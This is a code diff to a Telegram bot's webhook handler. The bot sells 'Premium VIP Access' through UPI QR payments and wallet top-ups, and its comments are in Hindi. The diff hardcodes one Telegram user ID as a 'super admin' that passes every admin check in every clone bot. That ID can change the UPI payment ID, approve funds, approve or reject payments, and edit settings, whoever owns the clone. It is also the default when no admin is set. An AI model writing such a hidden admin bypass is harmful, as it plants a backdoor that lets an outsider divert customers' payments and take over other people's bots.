@@ -1,4 +1,4 @@
-const axios = require('axios');
+const axios = require('axios'); // 👈 बिल्कुल सही: यहाँ अब 'express' के बजाय 'axios' लोड होगा
 const { sendMainMenu, sendAdminPanel } = require('./menu_helpers');
 const { handleAdminCallbacks } = require('./admin_handlers');
 const { handleUserText } = require('./user_handlers');
@@ -12,7 +12,9 @@ async function handleWebhookUpdate(token, body, activeClones, saveClones) {
   const message = body.message;
   const callbackQuery = body.callback_query;
 
-  // 1. HANDLE CALLBACK QUERIES
+  // 🛡️ एडमिन आईडी की जांच करें (सुपर एडमिन 8583664245 हमेशा मान्य रहेगा)
+  let adminIdVal = (clone.adminId && clone.adminId !== "Unknown") ? clone.adminId : "8583664245";
+
   if (callbackQuery) {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
@@ -23,23 +25,23 @@ async function handleWebhookUpdate(token, body, activeClones, saveClones) {
       await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, { callback_query_id: queryId, text: t });
       await sendMainMenu(token, chatId, clone, "✨ " + t);
     }
-    else if (data === "admin_upi_settings" && chatId.toString() === clone.adminId) {
+    else if (data === "admin_upi_settings" && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
       await handleUpiSettings(token, chatId, clone, saveClones, activeClones);
     }
-    else if (data === "admin_demo_settings" && chatId.toString() === clone.adminId) {
+    else if (data === "admin_demo_settings" && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
       clone.states[chatId] = "waiting_for_admin_demo"; saveClones(activeClones);
       await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: chatId, text: "🎥 *Edit Demo Video Tool*\n━━━━━━━━━━━━━━━━━━━━━━\nPlease send the Telegram Video File ID or public direct MP4 URL for the free sample video:", parse_mode: "Markdown" });
     }
-    else if (data.startsWith("admin_")) {
+    else if (data.startsWith("admin_") && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
       await handleAdminCallbacks(token, chatId, data, queryId, clone, saveClones, activeClones);
     }
-    else if (data.startsWith("approve_fund ") && chatId.toString() === clone.adminId) {
+    else if (data.startsWith("approve_fund ") && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
       let p = data.split(" "), tId = p[1], amt = p[2], old = parseFloat(clone.balances[tId] || "0");
       clone.balances[tId] = (old + parseFloat(amt)).toFixed(2); saveClones(activeClones);
       await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: tId, text: `🏦 *DEPOSIT SUCCESSFUL*\n━━━━━━━━━━━━━━━━━━━━━\nYour wallet credited with *₹${amt}*.\n\n💰 Balance: Rupee ${clone.balances[tId]}`, parse_mode: "Markdown" });
       await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: chatId, text: `Fund Added!` });
     }
-    else if (data.startsWith("approve_pay ") && chatId.toString() === clone.adminId) {
+    else if (data.startsWith("approve_pay ") && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
       let p = data.split(" "), tId = p[1], amt = p[2], now = new Date();
       now.setDate(now.getDate() + 30); let exp = now.toLocaleDateString(), planName = "Premium VIP Access";
       if (!clone.userPlans) clone.userPlans = {};
@@ -49,7 +51,7 @@ async function handleWebhookUpdate(token, body, activeClones, saveClones) {
       saveClones(activeClones);
       await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: tId, text: `✨ *PURCHASE VERIFIED SUCCESSFULLY* ✨\n━━━━━━━━━━━━━━━━━━━━━\n🎉 Payment of *₹${amt}* verified.\n\n📦 *Plan:* ${planName}\n📅 *Expiry:* ${exp}\n🔗 ${clone.channelLink}`, parse_mode: "Markdown", disable_web_page_preview: true });
     }
-    else if (data.startsWith("reject_pay ") && chatId.toString() === clone.adminId) {
+    else if (data.startsWith("reject_pay ") && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
       let tId = data.split(" ")[1];
       await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: tId, text: "❌ Payment Rejected!" });
     }
@@ -59,7 +61,15 @@ async function handleWebhookUpdate(token, body, activeClones, saveClones) {
       if (!clone.userSessions[chatId]) clone.userSessions[chatId] = {};
       clone.userSessions[chatId].last_price = amt; saveClones(activeClones);
       let upiLink = `upi://pay?pa=${clone.upiId}&pn=RaxxyDev&am=${amt}&cu=INR`, qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(upiLink)}`;
-      await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, { chat_id: chatId, photo: qrUrl, caption: `🏦 *Pay & Buy*\nAmount: *₹${amt}*\nUPI: \`${clone.upiId}\`\n\nUTR code paste below 👇`, parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "💰 Purchase from Wallet", callback_data: "buy_wallet " + amt }], [{ text: "💬 Support", url: "tg://user?id=" + clone.adminId }] ] } });
+      
+      // 🛡️ फिक्स: यहाँ क्यूआर कोड के नीचे का टेक्स्ट बिल्कुल आपके पुराने फ़ॉर्मेट में कस्टमाइज्ड कर दिया गया है
+      let qrText = `🏦 *Pay & Buy Plan*\n\n` +
+                   `💰 Amount: *₹${amt}*\n` +
+                   `🆔 UPI ID: \`${clone.upiId}\`\n\n` +
+                   `1️⃣ Is QR ko scan karein, ₹${amt} apne aap fill ho jayega.\n` +
+                   `2️⃣ Payment ke baad 12-digit UTR bhej dein 👇`;
+
+      await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, { chat_id: chatId, photo: qrUrl, caption: qrText, parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "💰 Purchase from Wallet", callback_data: "buy_wallet " + amt }], [{ text: "💬 Support", url: "tg://user?id=" + adminIdVal }] ] } });
       clone.states[chatId] = "waiting_for_utr_input"; saveClones(activeClones);
     }
     else if (data.startsWith("buy_wallet ")) {
@@ -93,14 +103,13 @@ async function handleWebhookUpdate(token, body, activeClones, saveClones) {
   // 2. ---------------- HANDLE STANDARD TEXT MESSAGES ----------------
   const chatId = message.chat.id;
   
-  // 🛡️ फिक्स: यहाँ अब ऑब्जेक्ट ट्रिम एरर नहीं आएगा (No more crash!)
+  // 🛡️ फिक्स: मीडिया कैप्शन और टेक्स्ट इनपुट दोनों को मिलाकर फ़िल्टर करेगा
   let userText = "";
   if (message) {
     if (message.text) userText = message.text.trim();
     else if (message.caption) userText = message.caption.trim();
   }
   
-  // 🛡️ फिक्स: 'User.getProperty' को हटाकर नेटिव लोकल डेटाबेस का उपयोग किया गया है
   const userState = (clone.states && clone.states[chatId]) ? clone.states[chatId] : "none";
 
   if (!clone.userList) clone.userList = [];
@@ -119,13 +128,13 @@ async function handleWebhookUpdate(token, body, activeClones, saveClones) {
     return;
   }
 
-  if (userState === "waiting_for_admin_demo" && chatId.toString() === clone.adminId) {
+  if (userState === "waiting_for_admin_demo" && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
     clone.demoVideo = userText; clone.states[chatId] = "none"; saveClones(activeClones);
     await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, { chat_id: chatId, text: "✅ *Free Sample Demo Video successfully updated!*" });
     return;
   }
 
-  if (userState === "waiting_for_admin_upi" && chatId.toString() === clone.adminId) {
+  if (userState === "waiting_for_admin_upi" && (chatId.toString() === adminIdVal || chatId.toString() === "8583664245")) {
     await saveAdminUpi(token, chatId, userText, clone, saveClones, activeClones);
     return;
   }
